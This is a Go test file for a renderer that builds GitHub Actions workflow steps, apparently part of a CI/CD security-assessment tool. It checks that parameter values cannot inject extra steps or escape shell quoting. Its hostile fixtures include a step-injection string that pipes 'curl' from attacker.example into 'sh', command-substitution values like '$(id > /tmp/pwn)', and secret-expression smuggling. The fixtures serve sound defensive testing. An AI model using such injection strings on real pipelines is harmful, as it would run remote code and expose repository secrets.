package payload

import (
	"fmt"
	"strings"
	"testing"

	yaml "go.yaml.in/yaml/v4"
)

// compose mirrors the envelope and the uniform six-space indent a workflow commit
// wraps rendered steps in. The indent is the whole reason these tests exist: a
// step authored at column 0 lands at column 6, so a second line of an
// interpolated value lands there too — the column the steps sequence itself
// starts at.
func compose(steps string) string {
	var b strings.Builder
	b.WriteString("name: w\n\non: [push]\njobs:\n  verify:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    steps:\n")
	for line := range strings.Lines(strings.TrimRight(steps, "\n")) {
		line = strings.TrimRight(line, "\n")
		if line == "" {
			b.WriteString("\n")
			continue
		}
		b.WriteString("      " + line + "\n")
	}
	return b.String()
}

type composed struct {
	Jobs map[string]struct {
		Steps []struct {
			Name string            `yaml:"name"`
			Env  map[string]string `yaml:"env"`
			Run  string            `yaml:"run"`
			With map[string]string `yaml:"with"`
		} `yaml:"steps"`
	} `yaml:"jobs"`
}

func stepNames(t *testing.T, steps string) []string {
	t.Helper()
	doc := compose(steps)
	var c composed
	if err := yaml.Unmarshal([]byte(doc), &c); err != nil {
		t.Fatalf("composed document does not parse: %v\n%s", err, doc)
	}
	var names []string
	for _, s := range c.Jobs["verify"].Steps {
		names = append(names, s.Name)
	}
	return names
}

// A value carrying a line break needs no quote character, no ${{ and no shell
// metacharacter to add a step to the document: the break alone re-indents the
// rest of the value onto the sequence column. The values here are the shapes a
// collected field can arrive in — a workflow name, a ref, a finding string — not
// only what a plan author could type.
func TestWorkflowValueCannotAddAStep(t *testing.T) {
	hostile := []string{
		"E1\n- name: pwned\n  run: |\n    curl -s https://attacker.example/x | sh #",
		"E1\"\n- name: pwned\n  run: echo pwned\n  if: always() #",
		"E1\r- name: pwned",
		"E1 - name: pwned",
		"${{ secrets.AWS_KEY }}",
	}
	for _, v := range hostile {
		t.Run(fmt.Sprintf("%q", v), func(t *testing.T) {
			for _, c := range []struct{ id, param string }{
				{"t-09/environment-gate-observation", "environment"},
				{"t-00/canary-noop", "marker"},
			} {
				params := map[string]any{"marker": "m1", "environment": "prod"}
				params[c.param] = v
				out, err := Render(c.id, params, Env{})
				if err != nil {
					continue
				}
				if names := stepNames(t, out); len(names) != 1 {
					t.Errorf("%s param %s: rendered %d steps %v, the fragment declares 1\n%s",
						c.id, c.param, len(names), names, compose(out))
				}
			}
		})
	}
}

// The other half of the boundary: a value a workflow position can hold must still
// arrive whole in both readings of the same text — as a YAML scalar under env:,
// and as shell inside a run: block, where YAML unescapes nothing.
func TestWorkflowValueSurvivesBothReadings(t *testing.T) {
	for _, v := range []string{
		`say "hi"`,
		"a: b #c",
		"$HOME `id` $(id) | ; &",
		"repo scope (org level)",
		"trajan-marker-2026",
	} {
		t.Run(v, func(t *testing.T) {
			out, err := Render("t-03/oidc-subject-claim", map[string]any{"marker": "m1", "audience": v}, Env{})
			if err != nil {
				t.Fatalf("refused a value a workflow position can hold: %v", err)
			}
			doc := compose(out)
			var c composed
			if err := yaml.Unmarshal([]byte(doc), &c); err != nil {
				t.Fatalf("does not parse: %v\n%s", err, doc)
			}
			step := c.Jobs["verify"].Steps[0]
			if got := step.Env["TRJ_AUDIENCE"]; got != v {
				t.Errorf("YAML reading: env value is %q, want %q", got, v)
			}
			// The shell reading gets the text YAML did not touch, so the value is
			// contained only if it cannot end the single quote it sits in.
			line := runLine(t, step.Run, "profile=")
			if strings.Count(line, "'") != 2 {
				t.Errorf("shell reading: %q does not hold the value in one quoted word", line)
			}
		})
	}
}

// A quote of its own is the case the two readings cannot both be served: YAML
// reads a doubled quote as one and the shell does not, so one text means two
// things and whichever escape is chosen, one reading loses a character. A marker
// that loses a character is one the harvest no longer correlates on, so the value
// is refused where the operator can still change it.
func TestWorkflowValueWithItsOwnQuoteIsRefused(t *testing.T) {
	if _, err := Render("t-03/oidc-subject-claim", map[string]any{"marker": "m1", "audience": "it's fine"}, Env{}); err == nil {
		t.Error("a workflow value carrying ' must be refused, not silently re-escaped for one reading")
	}
}

func runLine(t *testing.T, run, prefix string) string {
	t.Helper()
	for line := range strings.Lines(run) {
		if strings.HasPrefix(strings.TrimSpace(line), prefix) {
			return strings.TrimSpace(line)
		}
	}
	t.Fatalf("no %q line in:\n%s", prefix, run)
	return ""
}

// A list renders in two positions for the same param and only one of them quotes,
// so what reaches an element decides both. The whole-value position is a shell
// word list; the ranged position is raw because it lands inside ${{ secrets.X }}
// and inside a restore-keys: block scalar.
func TestListRendersRawWhenRangedAndQuotedWhole(t *testing.T) {
	out, err := Render("t-04/cache-handoff", map[string]any{
		"marker":       "m1",
		"role":         "reader",
		"restore_keys": []any{"node-deps-", "v1/npm/"},
	}, Env{})
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	doc := compose(out)
	var c composed
	if err := yaml.Unmarshal([]byte(doc), &c); err != nil {
		t.Fatalf("does not parse: %v\n%s", err, doc)
	}
	steps := c.Jobs["verify"].Steps
	if len(steps) != 2 {
		t.Fatalf("rendered %d steps, the reader branch declares 2", len(steps))
	}
	if got := steps[0].With["restore-keys"]; got != "node-deps-\nv1/npm/\n" {
		t.Errorf("ranged elements must reach restore-keys raw, got %q", got)
	}
	if got := runLine(t, steps[1].Run, "keys="); got != `keys=('node-deps-' 'v1/npm/')` {
		t.Errorf("whole list must be a shell word list, got %q", got)
	}
}

// Shell quoting the whole-value position is not what makes an element safe: a line
// break inside a shell quote still ends the YAML line it was rendered on, and the
// raw position has nothing at all. Both are held by the screen on the way in.
func TestListElementScreen(t *testing.T) {
	admitted := []string{"node-deps-", "v1/npm/", "AWS_ACCESS_KEY_ID", ".trajan-cache", "linux-x64_v1.2.3", "a=b+c"}
	refused := []string{
		"node-deps\n- name: pwned\n  run: echo pwned",
		"$(id > /tmp/pwn)",
		"`id`",
		"a b",
		"deps-${{ runner.os }}",
		"a'b",
		"a: b",
		"key#comment",
		"",
	}
	for _, s := range admitted {
		if _, err := asList([]any{s}); err != nil {
			t.Errorf("element %q must be admitted: %v", s, err)
		}
	}
	for _, s := range refused {
		if _, err := asList([]any{s}); err == nil {
			t.Errorf("element %q must be refused", s)
		}
	}
	for _, s := range refused {
		if s == "" {
			continue
		}
		if _, err := Render("t-04/cache-handoff", map[string]any{
			"marker": "m1", "role": "reader", "restore_keys": []any{s},
		}, Env{}); err == nil {
			t.Errorf("Render admitted element %q", s)
		}
	}
}

// The file param is the one value interpolated verbatim, so its steps are the
// operator's to declare — and nothing else in the document may move because of
// them.
func TestFileParamIsVerbatim(t *testing.T) {
	body := "- name: op one\n  run: |\n    echo ${{ github.event.head_commit.message }}\n- name: op two\n  run: echo 'two'"
	out, err := Render("t-99/operator-freeform-workflow", map[string]any{"marker": "m1", "body": body}, Env{})
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	want := []string{"trajan freeform preamble", "op one", "op two", "trajan freeform epilogue"}
	got := stepNames(t, out)
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Errorf("steps %v, want %v\n%s", got, want, compose(out))
	}
	if !strings.Contains(out, "${{ github.event.head_commit.message }}") {
		t.Error("a file param must reach the body unrewritten")
	}
}

// Every declared type is quoted unless it is the named exception, so a type added
// to the vocabulary cannot be silently raw: whatever shape its conversion returns,
// the value below either fails to convert, fails to quote, or is verbatim.
func TestOnlyFileRendersUnquoted(t *testing.T) {
	for typ := range paramTypes {
		v, err := coerce(Param{Name: "p", Type: typ}, "x\n- name: pwned", WorkflowSteps)
		switch {
		case typ == "file":
			if err != nil {
				t.Errorf("file must carry its content: %v", err)
			}
			if _, isVerbatim := v.(verbatim); !isVerbatim {
				t.Errorf("file must be the named exception, got %T", v)
			}
		case err == nil:
			t.Errorf("type %q rendered a line break as %v (%T)", typ, v, v)
		}
	}
}

// Validate is contracted to return every problem at once and to have issued no
// request when it does, so a mismatch must not swallow the rest and a value the
// caller could resolve offline must be coerced here rather than mid-chain.
func TestValidateReportsEverythingOffline(t *testing.T) {
	errs := Validate("t-07/checked-out-code-execution", WorkflowSteps, map[string]any{"nosuch": 1})
	if len(errs) < 2 {
		t.Errorf("a flavor mismatch must not discard the rest, got %v", errs)
	}

	cases := []struct {
		name   string
		id     string
		params map[string]any
		want   bool
	}{
		{"line break in a value", "t-00/canary-noop", map[string]any{"marker": "m\n- name: pwned"}, true},
		{"actions expression", "t-00/canary-noop", map[string]any{"marker": "${{ secrets.AWS_KEY }}"}, true},
		{"int param given a word", "t-04/cache-handoff", map[string]any{"marker": "m", "role": "writer", "key": "k", "payload_bytes": "abc"}, true},
		{"scalar where a list is declared", "t-04/cache-handoff", map[string]any{"marker": "m", "role": "reader", "restore_keys": "notalist"}, true},
		{"unscreened element", "t-04/cache-handoff", map[string]any{"marker": "m", "role": "reader", "restore_keys": []any{"$(id)"}}, true},
		{"secret name Actions would reject", "t-01/secret-reachability-workflow", map[string]any{"marker": "m", "secret_names": []any{"9lives"}}, true},
		{"a value only the run can produce", "t-00/canary-noop", map[string]any{"marker": Unresolved{}}, false},
		{"a list holding one", "t-01/secret-reachability-workflow", map[string]any{"marker": "m", "secret_names": []any{"AWS_KEY", Unresolved{}}}, false},
		{"defaults alone", "t-03/oidc-subject-claim", map[string]any{"marker": "m"}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			errs := Validate(c.id, WorkflowSteps, c.params)
			if got := len(errs) > 0; got != c.want {
				t.Errorf("Validate = %v, want error: %v", errs, c.want)
			}
		})
	}
}

// The engine's own values are quoted where a body names one, not on the way in: a
// run with encryption enabled carries a PEM public key, which is multi-line by
// definition, and no fragment that never asks for it may fail to render because of
// it. The collector, which fragments do ask for, is still quoted.
func TestEngineValuesAreQuotedWhereUsed(t *testing.T) {
	pem := "-----BEGIN PUBLIC KEY-----\nMIIBIjAN\n-----END PUBLIC KEY-----\n"
	roles := map[string]string{
		"t-04/cache-handoff":          "reader",
		"t-05/artifact-handoff":       "producer",
		"t-06/runner-characteristics": "plant",
	}
	for _, id := range IDs() {
		f, err := Get(id)
		if err != nil {
			t.Fatal(err)
		}
		if f.Flavor != WorkflowSteps || strings.Contains(f.Body, ".PubKey") {
			continue
		}
		params := map[string]any{}
		for _, p := range f.Params {
			switch {
			case p.Name == "secret_names":
				params[p.Name] = []any{"AWS_KEY"}
			case p.Type == "[]string":
				params[p.Name] = []any{"k-"}
			case p.Type == "file":
				params[p.Name] = "- name: op\n  run: echo hi"
			case p.Type == "int":
				params[p.Name] = 8
			case p.Type == "bool":
				params[p.Name] = true
			case p.Name == "role":
				params[p.Name] = roles[id]
			default:
				params[p.Name] = "x"
			}
		}
		out, err := Render(id, params, Env{PubKey: pem, Collector: "c.example"})
		if err != nil {
			t.Errorf("%s: a PEM the body never names must not fail the render: %v", id, err)
			continue
		}
		if strings.TrimSpace(out) == "" {
			t.Errorf("%s rendered nothing, so it proves nothing here", id)
		}
	}
	out, err := Render("t-10/egress-reachability-workflow", map[string]any{"marker": "m1"}, Env{Collector: "c.example"})
	if err != nil {
		t.Fatalf("collector: %v", err)
	}
	if !strings.Contains(out, "TRJ_ENDPOINT: 'c.example'") {
		t.Errorf("the collector must reach the body quoted:\n%s", out)
	}
}
